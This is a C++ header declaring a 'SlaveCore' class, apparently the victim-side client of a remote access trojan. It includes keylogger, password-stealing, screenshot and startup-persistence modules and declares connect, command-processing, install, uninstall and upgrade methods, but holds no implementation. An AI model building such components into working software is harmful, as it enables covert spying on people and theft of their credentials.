#pragma once

#include <common/NonCopyable.hpp>
#include <common/Innocence.hpp>

#include <blaspheme/transfer/FileTransfer.hpp>
#include <blaspheme/protocol/Authentication.hpp>

#include <malicious/Keylogger.hpp>
#include <malicious/Passwords.hpp>
#include <malicious/Screenshot.hpp>
#include <malicious/ProgramStart.hpp>

#include "CommandDispatcher.hpp"

namespace Inhibition
{
    class SlaveCore : public Common::NonCopyable
    {
        public:

            SlaveCore(Common::ConnectionInfo info);
			~SlaveCore();
			void exit();
            bool connect();
            bool acquire_stream();
            bool process_command();
            bool exiting();
            void disconnect();
            bool uninstall();
            void upgrade();
            const std::string& getInstallPath();

			const Common::ConnectionInfo& getConnection() const;
            void setConnection(const Common::ConnectionInfo& info);
			Blaspheme::Session& getSession();

        private:
			
			bool exited;

            Blaspheme::Session session;
            Malicious::Screenshot screenshot;
            CommandDispatch dispatcher;

            std::string dllPath;
            std::string keylogPath;
            std::string installPath;
			Malicious::ProgramStartupKey startup;
    };
    
} // Inhibition
